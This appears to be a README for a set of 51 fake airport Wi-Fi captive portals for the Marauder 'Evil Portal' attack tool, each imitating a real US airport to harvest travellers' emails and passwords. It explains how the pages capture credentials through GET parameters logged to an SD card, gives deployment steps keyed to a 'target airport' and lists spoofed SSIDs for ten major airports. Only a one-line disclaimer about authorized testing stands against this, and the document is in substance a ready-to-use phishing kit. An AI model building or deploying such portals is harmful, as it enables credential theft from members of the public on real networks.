# Airport Captive Portals — README
## Marauder Airport Evil Portal Library

---

## Overview

51 airport-specific captive portals built for the Marauder V8 / Mini V3 evil portal
framework. Each portal is a standalone HTML file with zero external dependencies —
no CDN calls, no web fonts, no JavaScript. All credentials are captured via GET
parameters at `/get?email=...&password=...` and logged to the Marauder SD card.

---

## Verified Format (All 51 Files)

| Requirement              | Status  |
|--------------------------|---------|
| `action="/get"`          | ✅ All  |
| `name="email"`           | ✅ All  |
| `name="password"`        | ✅ All  |
| No `method=` attribute   | ✅ All  |
| No external dependencies | ✅ All  |
| JavaScript-free forms    | ✅ All  |

---

## Design

Each portal uses a **dark navy departure-board aesthetic** that reads as a genuine
airport WiFi captive portal. Key design elements:

- **IATA code** — 38px bold, displayed prominently in the top-left header
- **Full airport name** — displayed next to the IATA code with governing authority and city
- **Animated green pulse dot** — mimics a live "connected" indicator
- **Network SSID** — shown in the status bar with terminal/concourse scope
- **Airport-specific welcome message** — unique to each airport
- **Notice banner** — session validity / traveler info block below the form
- **Dark navy color scheme** — `#0a1628` body / `#0f1e35` card / `#0d1a2e` bars
- **Accent color** — varies by airport (blue, red, gold, orange, green)

---

## File Naming Convention

All files follow the pattern:

```
airport-{iata_lowercase}.html
```

Exception: JFK has two portals — `airport-jfk.html` (all terminals) and
`airport-jfk-t4.html` (Terminal 4 / international).

---

## Portal Index

### Northeast

| File | IATA | Airport | City | Accent |
|------|------|---------|------|--------|
| `airport-jfk.html` | JFK | John F. Kennedy International Airport | Jamaica, Queens, NY | Blue |
| `airport-jfk-t4.html` | JFK | JFK International — Terminal 4 | Jamaica, Queens, NY | Blue |
| `airport-lga.html` | LGA | LaGuardia Airport | East Elmhurst, Queens, NY | Blue |
| `airport-ewr.html` | EWR | Newark Liberty International Airport | Newark, NJ | Red |
| `airport-bos.html` | BOS | Boston Logan International Airport | Boston, MA | Red |
| `airport-phl.html` | PHL | Philadelphia International Airport | Philadelphia, PA | Blue |
| `airport-bwi.html` | BWI | Baltimore/Washington International | Linthicum Heights, MD | Red |
| `airport-dca.html` | DCA | Ronald Reagan Washington National | Arlington, VA | Red |
| `airport-iad.html` | IAD | Washington Dulles International | Dulles, VA | Blue |

### Southeast

| File | IATA | Airport | City | Accent |
|------|------|---------|------|--------|
| `airport-atl.html` | ATL | Hartsfield-Jackson Atlanta International | Atlanta, GA | Blue |
| `airport-mia.html` | MIA | Miami International Airport | Miami, FL | Green |
| `airport-mco.html` | MCO | Orlando International Airport | Orlando, FL | Orange |
| `airport-clt.html` | CLT | Charlotte Douglas International | Charlotte, NC | Blue |
| `airport-rdu.html` | RDU | Raleigh-Durham International | Morrisville, NC | Red |
| `airport-bna.html` | BNA | Nashville International Airport | Nashville, TN | Red |
| `airport-msy.html` | MSY | Louis Armstrong New Orleans International | Kenner, LA | Red |
| `airport-mem.html` | MEM | Memphis International Airport | Memphis, TN | Blue |

### Midwest

| File | IATA | Airport | City | Accent |
|------|------|---------|------|--------|
| `airport-ord.html` | ORD | O'Hare International Airport | Chicago, IL | Blue |
| `airport-mdw.html` | MDW | Chicago Midway International | Chicago, IL | Red |
| `airport-msp.html` | MSP | Minneapolis-Saint Paul International | Minneapolis-Saint Paul, MN | Blue |
| `airport-dtw.html` | DTW | Detroit Metropolitan Wayne County | Romulus, MI | Blue |
| `airport-stl.html` | STL | St. Louis Lambert International | St. Louis, MO | Red |
| `airport-ind.html` | IND | Indianapolis International Airport | Indianapolis, IN | Blue |
| `airport-cmh.html` | CMH | John Glenn Columbus International | Columbus, OH | Red |
| `airport-kci.html` | KCI | Kansas City International Airport | Kansas City, MO | Blue |
| `airport-oma.html` | OMA | Eppley Airfield | Omaha, NE | Blue |
| `airport-lnk.html` | LNK | Lincoln Airport | Lincoln, NE | Red |
| `airport-fwa.html` | FWA | Fort Wayne International Airport | Fort Wayne, IN | Red |
| `airport-fsd.html` | FSD | Sioux Falls Regional Airport | Sioux Falls, SD | Blue |

### South / Texas

| File | IATA | Airport | City | Accent |
|------|------|---------|------|--------|
| `airport-dfw.html` | DFW | Dallas/Fort Worth International | Dallas-Fort Worth, TX | Red |
| `airport-iah.html` | IAH | George Bush Intercontinental | Houston, TX | Green |
| `airport-hou.html` | HOU | William P. Hobby Airport | Houston, TX | Blue |
| `airport-sat.html` | SAT | San Antonio International | San Antonio, TX | Red |
| `airport-aus.html` | AUS | Austin-Bergstrom International | Austin, TX | Orange |
| `airport-okc.html` | OKC | Will Rogers World Airport | Oklahoma City, OK | Red |
| `airport-tul.html` | TUL | Tulsa International Airport | Tulsa, OK | Orange |
| `airport-elp.html` | ELP | El Paso International Airport | El Paso, TX | Red |
| `airport-lbb.html` | LBB | Lubbock Preston Smith International | Lubbock, TX | Red |
| `airport-abq.html` | ABQ | Albuquerque International Sunport | Albuquerque, NM | Orange |

### West

| File | IATA | Airport | City | Accent |
|------|------|---------|------|--------|
| `airport-lax.html` | LAX | Los Angeles International Airport | Los Angeles, CA | Blue |
| `airport-sfo.html` | SFO | San Francisco International Airport | San Francisco, CA | Green |
| `airport-sea.html` | SEA | Seattle-Tacoma International | Seattle, WA | Blue |
| `airport-den.html` | DEN | Denver International Airport | Denver, CO | Blue |
| `airport-phx.html` | PHX | Phoenix Sky Harbor International | Phoenix, AZ | Orange |
| `airport-slc.html` | SLC | Salt Lake City International | Salt Lake City, UT | Blue |
| `airport-pdx.html` | PDX | Portland International Airport | Portland, OR | Green |
| `airport-san.html` | SAN | San Diego International Airport | San Diego, CA | Red |
| `airport-las.html` | LAS | Harry Reid International Airport | Las Vegas, NV | Gold |
| `airport-hnl.html` | HNL | Daniel K. Inouye International | Honolulu, HI | Green |
| `airport-anc.html` | ANC | Ted Stevens Anchorage International | Anchorage, AK | Blue |

---

## Deployment

1. Choose the portal matching your target airport's SSID
3. Copy to root on the Marauder SD card
4. Launch **Evil Portal** from the Marauder UI
5. Credentials log to `/logs/` as GET params:
   ```
   /get?email=victim@email.com&password=hunter2
   ```

### Recommended SSID Pairings

| Portal | Spoof SSID |
|--------|-----------|
| `airport-atl.html` | `ATL-AirportWiFi` |
| `airport-lax.html` | `LAX-FreeWiFi` |
| `airport-ord.html` | `ORD-WiFi` |
| `airport-dfw.html` | `DFW-WiFi` |
| `airport-jfk.html` | `JFK-FreeWiFi` |
| `airport-den.html` | `DEN-FreeWiFi` |
| `airport-sfo.html` | `SFO-WiFi` |
| `airport-sea.html` | `SEA-FreeWiFi` |
| `airport-mco.html` | `MCO-WiFi` |
| `airport-las.html` | `LAS-AirportWiFi` |

*For authorized penetration testing on networks you own or have explicit written permission to test.*
